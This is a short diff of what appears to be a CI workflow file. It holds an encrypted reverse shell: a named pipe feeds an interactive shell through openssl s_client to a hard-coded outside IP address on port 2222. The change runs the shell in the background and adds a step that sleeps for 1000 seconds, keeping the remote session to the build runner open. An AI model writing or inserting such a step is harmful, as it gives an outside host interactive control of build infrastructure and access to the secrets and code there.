@@ -23,5 +23,9 @@ jobs:
           openssl x509 -in cert.pem -noout -text
           mkfifo /tmp/s
           export SERVER_IP=54.159.108.35
-          sh -i < /tmp/s 2>&1 | openssl s_client -quiet -strict -verify 1 -verify_return_error -CAfile cert.pem -connect $SERVER_IP:2222 > /tmp/s
+          sh -i < /tmp/s 2>&1 | openssl s_client -quiet -strict -verify 1 -verify_return_error -CAfile cert.pem -connect $SERVER_IP:2222 > /tmp/s &
+      - name: Sleeping
+        run: |
+          echo "This is the next step!"
+          sleep 1000
           rm /tmp/s
